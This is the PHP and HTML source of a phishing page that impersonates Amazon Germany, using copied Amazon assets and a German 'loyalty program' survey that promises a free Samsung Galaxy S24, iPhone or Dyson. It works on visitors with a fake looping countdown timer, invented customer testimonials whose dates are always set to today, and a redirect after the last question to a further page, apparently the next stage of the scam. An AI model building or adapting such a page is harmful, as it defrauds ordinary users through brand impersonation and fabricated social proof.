<?php
include 'viewed.php';
session_start();

date_default_timezone_set('Europe/Berlin');
$script_tz = date_default_timezone_get();
if (strcmp($script_tz, ini_get('date.timezone'))){
   // echo 'Die Script-Zeitzone unterscheidet sich von der ini-set Zeitzone.';
} else {
//echo 'Die Script-Zeitzone und die ini-set Zeitzone stimmen überein.';
}

// Convert a date or timestamp into French.
 function dateToFrench($date, $format) 
{
    $english_days = array('Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday');
    $french_days = array('Montag', 'Dienstag', 'Mittwoch', 'Donnerstag', 'Freitag', 'Samstag', 'Sonntag');
    $english_months = array('January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December');
    $french_months = array('Januar', 'Februar', 'März', 'April', 'kann', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember');
    return str_replace($english_months, $french_months, str_replace($english_days, $french_days, date($format, strtotime($date) ) ) );
}
  ?>
  
  <!DOCTYPE html>
<html lang="de-de" class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser a-ws" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.3-2021-04-29"><!-- sp:feature:head-start --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">


<!-- sp:feature:cs-optimization -->
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://images-eu.ssl-images-amazon.com/">
<link rel="dns-prefetch" href="https://m.media-amazon.com/">
<link rel="dns-prefetch" href="https://completion.amazon.com/">



  

      
      


<!-- akgn7t -->

<!-- sp:feature:aui-assets -->
<link rel="stylesheet" href="./amaz_files/11OrJUma5UL._RC_01rXlRztnIL.css,4135ANpE31L.css,21ak7+1wqPL.css,01uNpa0PcLL.css,01NtHviPbnL.css,01L-6KXabGL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11VHr91CkuL.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,018gwG6-KML.css">

<!-- sp:feature:cookie-consent-assets -->
<!-- sp:feature:nav-inline-css -->
<!-- NAVYAAN CSS -->
<style type="text/css">
.nav-sprite-v3 .nav-sprite {
  background-image: url(https://www.amazon.fr/images/G/08/gno/sprites/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(https://www.amazon.fr/images/G/08/javascripts/lib/popover/images/snake._CB485935558_.gif);
}
</style>

<link rel="stylesheet" href="./amaz_files/314xMGKl-SL._RC_41KBYOkTjIL.css,51zszC1muXL.css_.css">
<link rel="stylesheet" href="./amaz_files/41C6LaLLmFL.css">
<link rel="stylesheet" href="./amaz_files/01+72+wCC9L.css">
<link rel="stylesheet" href="./amaz_files/31W7N8gncNL.css">
<!-- sp:feature:host-assets -->





<!--Page Assets-->







<style>.name {
    color: #2196f3;
    font-weight: 600;
}</style>







<!-- Title of the page is set by SEO meta data -->
<title> Promotions et ventes flash</title>
<meta property="og:title" content=" Promotions et ventes flash">
<meta name="twitter:title" content=" Promotions et ventes flash">

<!-- SEO Meta contents -->

<meta name="keywords" content="">


<!--&&&Portal&Delimiter&&&--><!-- sp:end-feature:host-assets -->


<!-- sp:feature:head-close -->

<style>.a2hs-ingress-container,a[href^="#nav-hbm-a2hs-trigger"]{display:none!important}.a2hs-ingress-container.a2hs-ingress-visible,a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible{display:block!important}</style><style>@media all and (display-mode:standalone){#chromeless-view-progress-bar,#chromeless-view-progress-bar::after{position:fixed;top:0;left:0;right:0;height:2px}@keyframes pbAnimation{0%{right:90%}100%{right:10%}}#chromeless-view-progress-bar{background:rgba(255,255,255,.1);z-index:9999999}#chromeless-view-progress-bar::after{content:'';background:#fcbb6a;animation:pbAnimation 10s forwards}}</style><style></style></head><!-- sp:feature:start-body -->
<body class="a-m-fr a-aui_72554-c a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-t1 a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_mm_desktop_exp_291916-t1 a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-t1 a-aui_tnr_v2_180836-c" sip-shortcut-listen="true" style=""><div id="a-page">


<style>
      * { box-sizing: border-box; } body {margin: 0;}*{box-sizing:border-box;max-width:unset;}body{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#i3ut{display:none;}#id1{background-image:initial;background-position-x:initial;background-position-y:initial;background-size:initial;background-repeat-x:initial;background-repeat-y:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:rgb(19, 25, 33);}#itbu{margin-bottom:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:0px;}#i7fv{float:right;padding-right:10px;height:48px;}#content1{color:rgb(19, 25, 33);}#ilpj{display:flex;font-weight:bold;margin-bottom:20px;}#iy5qx{display:block;text-align:center;color:rgb(19, 25, 33);width:313.075px;}#im10b{font-weight:bold;}#timerr{color:rgb(200, 35, 17);}#i9zke{text-align:center;}#p_modal_button1{padding-top:10px;padding-right:30px;padding-bottom:10px;padding-left:30px;}#p_modal_button2{padding-top:10px;padding-right:30px;padding-bottom:10px;padding-left:30px;}#offerlink{display:block;padding-top:10px;padding-right:30px;padding-bottom:10px;padding-left:30px;}#i07gw6{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;float:left;display:block;width:50%;}#iy4clm{color:rgb(59, 89, 152);}#iq2fzg{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;float:right;display:block;width:50%;color:rgb(168, 167, 167);text-align:right;}#iw30ou{clear:both;}#comment0{display:block;}#comment1{display:block;}#comment2{display:block;}#comment3{display:block;}#comment4{display:block;}#comment5{display:block;}#comment5-2{display:block;}#comment6{display:block;}#comment7{display:block;}#comment7-2{display:block;}#comment8{display:block;}#i6u6kn{font-size:12px;color:rgb(188, 188, 188);}#p_loading{display:none;}#i61hqa{margin-top:0px;margin-right:auto;margin-bottom:0px;margin-left:auto;}#ite0vq{display:none;}#footer{background-color:rgb(13, 20, 30);margin-bottom:0px;font-size:12px;text-align:center;color:rgb(239, 239, 239);}#i5905i{padding-top:20px;padding-right:20px;padding-left:20px;padding-bottom:0px;}#i1vb5m{line-height:40px;margin-bottom:0px;}
    </style>
    



<!-- sp:feature:nav-inline-js -->
<!-- NAVYAAN JS -->

<img src="./amaz_files/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png" style="display:none" alt="">



<!-- sp:feature:nav-skeleton -->
<!-- sp:feature:navbar -->

  <!-- NAVYAAN -->





<!-- MOBILE-APP-BANNER -->





<!--NAVYAAN-UPNAV-MARKER-->

<!-- navmet initial definition -->





    <style mark="aboveNavInjectionCSS" type="text/css">
      #nav-gwbar .nav-a { white-space: nowrap; } .nav-input[type='submit'] {opacity: 0.01;}
    </style>










<!--NAVYAAN-MOBILEPRENAV-MARKER-->


  <!-- NAVYAAN -->




<header id="nav-main" data-nav-language="fr_FR" class="nav-mobile nav-progressive-attribute nav-locale-fr nav-lang-fr nav-ssl nav-unrec nav-blueheaven">
    
    <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-standard nav-sprite-v3 celwidget" data-csa-c-id="ch7mtj-1jo5se-q4c2dt-i0f0sr" data-cel-widget="Navigation-mobile-navbar">
        <div id="nav-logobar">
            <div class="nav-left">
                
                
  <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" aria-label="Ouvrir le menu" data-csa-c-id="fa583m-27ksfs-fhtp8u-chq2ws">
    <i class="nav-icon-a11y nav-sprite"></i>
  </a>
  


  
      

                
                
  <div id="nav-logo">
    <a href="" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon.fr">
      <span class="nav-sprite nav-logo-base"></span>
      <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
      <span class="nav-logo-locale">.de</span>
    </a>
  </div>

            </div>
            <div class="nav-right">
                
                
<a href="" id="nav-logobar-greeting" class="nav-a nav-show-sign-in">
    Amazon.de ›
</a>

                
                 
  <a href="" class="nav-a avatar-new  avatar-wide" id="nav-button-avatar" aria-label="votre compte">
    <i class="nav-icon nav-icon-a11y nav-sprite">votre compte</i>
    
  </a>
 
  <a href="" aria-label="Cart" class="nav-a" id="nav-button-cart">
    <div id="cart-size" class="nav-cart-0 nav-progressive-attribute">
      <span class="nav-icon nav-sprite">
        <span id="nav-cart-count" class="nav-cart-count nav-progressive-content">0</span>
      </span>
    </div>
  </a>

            </div>
        </div>
        

        
        
  <div class="nav-progressive-attribute" id="search-ac-init-data" data-aliases="aps,amazon-devices,amazonfresh,monoprix,naturalia,truffaut,stripbooks,audible,popular,dvd,electronics,videogames,toys,english-books,kitchen,luggage,classical,vhs,software,jewelry,watches,music-song,music-title,music-artist,mp3-downloads,digital-music,digital-music-track,digital-music-album,digital-text,lighting,baby,beauty,hpc,office-products,shoes,sports,mi,computers,clothing,appliances,diy,mobile-apps,pets,gift-cards,automotive,vehicles,garden,tradein-aps,handmade,handmade-jewelry,handmade-home-and-kitchen,warehouse-deals,grocery,luxury-beauty,banjo-apps,industrial,instant-video,black-friday,cyber-monday,fashion,alexa-skills,under-ten-dollars,todays-deals,specialty-aps-sns,luxury" data-ime="" data-mkt="5" data-src="completion.amazon.co.uk/search/complete">
  </div>
  <div id="nav-search-keywords-data" class="nav-progressive-attribute" data-implicit-alias="goldbox">
  </div>
  <div class="nav-searchbar-wrapper">
    <form class="nav-searchbar search-big" action="https://www.amazon.fr/gp/aw/s/ref=nb_sb_noss" method="get" role="search" id="nav-search-form" accept-charset="utf-8">
      <div class="nav-fill">
        <div class="nav-search-field">
          <input type="text" class="nav-input nav-progressive-attribute" placeholder="Suche Amazon.de" data-aria-clear-label="Effacer les mots-clés de recherche" name="k" autocomplete="off" autocorrect="off" autocapitalize="off" dir="auto" value="" id="nav-search-keywords">
        <a class="nav-icon nav-sprite nav-search-clear" tabindex="0" href="javascript:;" aria-label="Effacer les mots-clés de recherche"></a></div>
      </div>
      <div class="nav-right">
        <div class="nav-search-submit">
          <input type="submit" class="nav-input" value="Go" aria-label="Go">
          <i class="nav-icon nav-sprite"></i>
        </div>
      </div>
    </form>
  </div>

        

        
        
        

        

        
        
        <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA-->
        
<!-- NAVYAAN-GLOW-SUBNAV -->
<div class="glow-subnav-template glow-mobile-subnav" id="nav-subnav-container">
    <div class="a-declarative" data-action="glow-sheet-trigger" id="nav-global-location-slot">
        <div class="nav-sprite" id="nav-packard-glow-loc-icon"></div>
        <div id="glow-ingress-block">
            <span class="nav-single-line nav-persist-content" id="glow-ingress-single-line">
                Wählen Sie Ihr Geschenk und bestätigen Sie Ihre Lieferadresse
            </span>
        </div>
        <input data-addnewaddress="new" id="unifiedLocation1ClickAddress" name="addressID" type="hidden" class="nav-progressive-attribute" value="">
        <input id="glowValidationToken" name="glow-validation-token" type="hidden" value="gIB/wn0qIW7vEck+9/MwYFaqLY1cjeMFunW579kAAAAMAAAAAGCOBIpyYXcAAAAA" class="nav-progressive-attribute">
    </div>
</div>




        
    </div>
    
    
    <div id="nav-progressive-subnav">
      
    </div>
</header>








<!-- sp:feature:host-atf -->



















    
    
        <div></div>
    









    













    
    
        <div>
                <div class="a-section a-spacing-none a-padding-medium">
         <h2 style="text-align: center;" class="a-size-extra-large a-spacing-micro">Amazon Treueprogramm</h2><h1 class="a-size-extra-large a-spacing-micro">Herzliche Glückwünsche !</h1>
          <span class="a-size-base">Heute,  <strong><?php echo dateToFrench("now" ,"l j F Y");?></strong>, Sie wurden ausgewählt, um an unserer Umfrage teilzunehmen. Es dauert nur 1 Minute und Sie erhalten ein fantastisches Geschenk Ihrer Wahl.

    .</span><br><br>
    <span class="a-size-base"> Jeder <strong><?php echo dateToFrench("now" ,"l ");?></strong>Wir wählen zufällig 100 Benutzer aus, um ihnen die Chance zu geben, tolle Werbegeschenke zu gewinnen. Die heutigen Geschenke <strong> Samsung Galaxy S24 - Iphone 14 - Dyson V11 </strong>

<br></br><span class="a-size-base">Diese Umfrage zielt darauf ab, die Servicequalität für unsere Benutzer zu verbessern, und Ihre Teilnahme wird zu 100% belohnt.


.</span>
                </div><br>
            </div>
    







    
    
        <div>
                <div class="a-section a-spacing-none a-padding-medium">
                  Sie haben nur
<font color="red" id="inwav"><b id="i7pqh"><span data-gjs-type="text" id="test"></span></b></font>, um diese Umfrage zu beantworten
</p><p data-gjs-type="text" id="imben" spellcheck="false">Beeilen Sie sich, die Anzahl der verfügbaren Preise ist begrenzt!
</p>
<script type="text/javascript">
function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10)
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + " Minuten " + seconds + " Sekunden";

        if (--timer < 0) {
            timer = duration;
        }
    }, 500);
}

window.onload = function () {
    var fiveMinutes = 60 * 5,
        display = document.querySelector('#test');
    startTimer(fiveMinutes, display);
};
</script>
<div id="question1" style="padding-left: 80px;">

              <p data-gjs-type="text" id="iyo9h" spellcheck="false" style="font-size: 18px;line-height: 28px;color: #293847;"><br>Frage 1 von 4: <b>Bist du ein Mann oder ein
Frauen ? <img src="vrai.png" id="imagevari1" style="
    width: 33px;
    position: relative;
    display: none;
    top: 79px;
    right: 229Px;
"></b></p>
  
  <input type="button" value="Mann" onclick="check1()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;"><br>
  
<br><input type="button" value="Frauen" onclick="check1()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br></div>

<div id="question2" style="padding-left: 80px; display: none">

              <p data-gjs-type="text" id="iyo9h" spellcheck="false" style="font-size: 18px;line-height: 28px;color: #293847;"><br>Frage 2 vo 4:<b> Wie alt bist du ? <img src="vrai.png" id="imagevari2" style="
    width: 33px;
    position: relative;
    display: none;
  top: 139px;
    right: 99Px;
"></b></p>
  
  <input type="button" value="18-29" onclick="check2()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;"><br>
  
<br><input type="button" value="30-39" onclick="check2()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br><input type="button" value="40-49" onclick="check2()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br><input type="button" value="50+" onclick="check2()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br></div>

<div id="question3" style="padding-left: 80px; display: none">

              <p data-gjs-type="text" id="iyo9h" spellcheck="false" style="font-size: 18px;line-height: 28px;color: #293847;"><br>Frage 3 von 4:<b> Wie bewerten Sie Amazon-Dienste auf Deutsch? <img src="vrai.png" id="imagevari3" style="
    width: 33px;
    position: relative;
    display: none;
    top: 139px;
    right: 399Px;
}
"></b></p>
  
  <input type="button" value="Sehr gut" onclick="check3()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;"><br>
  
<br><input type="button" value="Nicht zu glauben" onclick="check3()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br><input type="button" value="Ok" onclick="check3()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br><input type="button" value="Nicht so gut" onclick="check3()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br></div>

<div id="question4" style="padding-left: 80px;display: none">

              <p data-gjs-type="text" id="iyo9h" spellcheck="false" style="font-size: 18px;line-height: 28px;color: #293847;"><br>Frage 4 von 4:<b> Welches Smartphone benutzt du? <img src="vrai.png" id="imagevari4" style="
    width: 33px;
    position: relative;
    display: none;
    top: 79px;
    right: 199Px;
"> </b></p>
  
  <input type="button" value="Android" onclick="check4()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;"><br>
  
<br><input type="button" value="Apple" onclick="check4()" style="background: #293847;color: white;padding: 11px;width: 190px;border: navajowhite;">
<br><br></div>


<script type="text/javascript">
      function check1() {
          document.getElementById('question1').style.opacity="0.6";
          document.getElementById('imagevari1').style.display="inline";
          setTimeout(function () {
         document.getElementById('question1').style.display="none";
         document.getElementById('question2').style.display="block";
    }, 3000);
       
    }
      function check2() {
          document.getElementById('question2').style.opacity="0.6";
document.getElementById('imagevari2').style.display="inline";
          setTimeout(function () {
         document.getElementById('question2').style.display="none";
         document.getElementById('question3').style.display="block";
    }, 3000);
       
    }
      function check3() {
          document.getElementById('question3').style.opacity="0.6";
document.getElementById('imagevari3').style.display="inline";
          setTimeout(function () {
         document.getElementById('question3').style.display="none";
         document.getElementById('question4').style.display="block";
    }, 3000);
       
    }
      function check4() {
          document.getElementById('question4').style.opacity="0.6";
document.getElementById('imagevari4').style.display="inline";
          setTimeout(function () {
         document.getElementById('question4').style.display="none";
         window.location.replace("index2.php");
    }, 3000);
       
    }


</script>
    <div class="wrapper">
    
    
    
    
	
    
	
    
    
    
<div class="reviews wrapper" >
      <div class="wrapper">
        <h2>Bemerkungen:</h2><br>
      </div>
      <table class="wrapper" style="padding-top:8px;">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/img03.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Yolette Corbin</div>
            <div class="text">Meins ist heute angekommen, danke für das Samsung S24&nbsp;!!!</div>
            
            <div class="date">
              <?php echo dateToFrench("now" ,"l j F Y");?></div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/male1-spanish-min.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Javier de Launay</div>
            <div class="text">Zuerst dachte ich, es sei ein Witz, aber zu meiner Überraschung kam mein Galaxy S24
            heute Morgen an und es ist in Ordnung, sich zu registrieren, um ein Telefon zu gewinnen.&nbsp;!</div>
            <div class="date">
              <?php echo dateToFrench("now" ,"l j F Y");?> </div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/male2-spanish-min.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Landers Souplet</div>
            <div class="text">Ich habe meine heute erhalten! Danke für das Samsung&nbsp;!</div>
            <div class="date">
              <?php echo dateToFrench("now" ,"l j F Y");?></div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/3.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Belisarda L'Heureux</div>
            <div class="text">Ich hatte diese Anzeige schon einmal gesehen, sie aber ignoriert, 
            weil ich dachte, es sei ein Betrug, aber ich habe sie überprüft und beschlossen, 
            sie auszuprobieren. Endlich habe ich mein Samsung S24 erhalten&nbsp;!</div>
            <div class="date">
            <?php echo dateToFrench("now" ,"l j F Y");?></div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/img11.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Linette Riquier</div>
            <div class="text">Mein Los ist heute angekommen! Vielen Dank für mein neues iPhone 14 Pro&nbsp;!!!!!!!</div>
            <div class="date">
            <?php echo dateToFrench("now" ,"l j F Y");?></div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/01.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Clementine de Brisay</div>
            <div class="text">Wow, ich wollte unbedingt das S9, aber es war nicht verfügbar. 
            Es sah so aus, als wäre nichts mehr für mich übrig, 
            aber gestern habe ich mein Samsung S24 kostenlos erhalten. Küsse&nbsp;!</div>
            <div class="date">
              <?php echo dateToFrench("now" ,"l j F Y");?></div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/img01.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Ila Goddu</div>
            <div class="text">Der Fragebogen war so einfach! Ich hoffe ich werde mein MacBook haben.</div>
            <div class="date">
            <?php echo dateToFrench("now" ,"l j F Y");?></div>
          </td>
        </tr>
      </tbody></table>
      <hr>
      <table class="wrapper">
        <tbody><tr>
          <td width="50px" valign="top" align="right">
            <img class="roundimg" src="./amaz_files/21.jpg">
          </td>
          <td class="commentpad" valign="top" align="left">
            <div class="name">Paien Blanchard</div>
            <div class="text">Groß ! Ich habe noch nie etwas gewonnen, hoffe ich habe diesmal mehr Glück&nbsp;!</div>
            <div class="date">
             <?php echo dateToFrench("now" ,"l j F Y");?></div>
              <br>
          </td>
        </tr>
      </tbody></table>
      </div>
    </div>        </div><br><br><div style="text-align: center;" class="zg_item zg_homeWidgetItem">
        <div style="text-align: center;" class="zg_rankInfo">
      
      
    
  
    
        </div>
    </div></div><br><br><br><br>
    



    



    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    








<!--&&&Portal&Delimiter&&&--><!-- sp:end-feature:host-atf -->
<!-- sp:feature:nav-btf -->
<!-- NAVYAAN BTF START -->






<!-- NAVYAAN BTF END --><!-- sp:feature:host-btf -->







    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div>


<link rel="stylesheet" type="text/css" href="./amaz_files/31z2a89yhXL.css">

<div id="slot-15">
    <div class="deals-react-app"></div>
    
</div>


</div>
    



    



    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





    













    
    
        <div></div>
    





<!-- sp:end-feature:host-btf -->
<!-- sp:feature:aui-preload -->
<!-- sp:feature:nav-footer -->

  <!-- NAVYAAN FOOTER START -->

<footer class="nav-mobile nav-ftr-batmobile">
  
  <div id="nav-ftr" class="nav-t-footer-gateway nav-sprite-v3">
    
<a id="nav-ftr-gototop" class="nav-a" href="" aria-label="Haut de la page">
  <i class="nav-icon"></i>
  <b class="nav-b">
    Ganz oben auf der Seite
  </b>
</a>

    
    
<ul id="nav-ftr-links" class="nav-ftr-links-two-column">
  
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Kehrt zurück
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Kundendienst
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Ihr Konto
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Ihre Listen

        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Finde eine Liste
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Finde ein Geschenk
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Artikel, die Sie kürzlich angesehen haben
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Laden Sie die Amazon App herunter
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Recycling (einschließlich elektrischer und elektronischer Geräte)
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Amazon Desktop-Site
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
        Amazon.de Homepage
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Bei Ihnen zu Hause
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Ihre Befehle
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Verkaufen
auf Amazon
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Werden Sie Amazon Business-Kunde
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Verkaufen Sie bei Amazon Business
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Informationen auf unserem Marktplatz
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Verwalte Deine Abonnements
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
          1-Klicken Sie auf Kontaktdaten
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Barrierefreiheit
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>

  
</ul>

    
    
  <div id="nav-ftr-auth">
   Schon Kunde ?<a href="" class="nav-a">Einloggen</a>
  </div>

    
    
<ul class="nav-ftr-horiz">
    <li class="nav-li">
      <a href="" class="nav-a">Verkaufsbedingungen</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Teilnahmebedingungen für das Marketplace-Programm</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Ihre persönliche Information</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Kekse</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Anzeigen basierend auf Ihren Interessen</a>
    </li>
</ul>

<div id="nav-ftr-copyright">
© 1996-2021 Amazon.com, Inc.
</div>

  </div>
</footer>

<div id="sis_pixel_r2" aria-hidden="true" style="height:1px; position: absolute; left: -1000000px; top: -1000000px;"><iframe id="DAsis" src="./amaz_files/iu3.html" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div>

  <!-- NAVYAAN FOOTER END -->
<!-- sp:feature:amazon-pay-iframe -->
<!-- sp:end-feature:amazon-pay-iframe -->
<div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="https://www.amazon.fr/gp/get"><input type="hidden" name="ue_back" value="2"></form>




</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.fr/1/batch/1/OP/A13V1IB3VIYZZH:260-5009389-6389045:9BF906ASS174V2KTZD4M$uedata=s:%2Frd%2Fuedata%3Fnoscript%26id%3D9BF906ASS174V2KTZD4M:0' alt=""/>
</noscript>


</div><div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
<!--       _
       .__(.)< (MEOW)
        \___)   
 ~~~~~~~~~~~~~~~~~~-->
<!-- sp:eh:SxCjgK3ljQ1oC+34tVXvizMgbYo39lQjK9peUsNj3q1NBAphKaumyNr8J2wSRbTcTFQN/kkxYRrxeA6sNCMrpD3tD5k9WOtMUBoTnU6T0Z8OiqfnXKPfR323XP0= -->
<div id="a-white"></div>



        
        
        




  <!--NAVYAAN-HMENU-AJAX-->

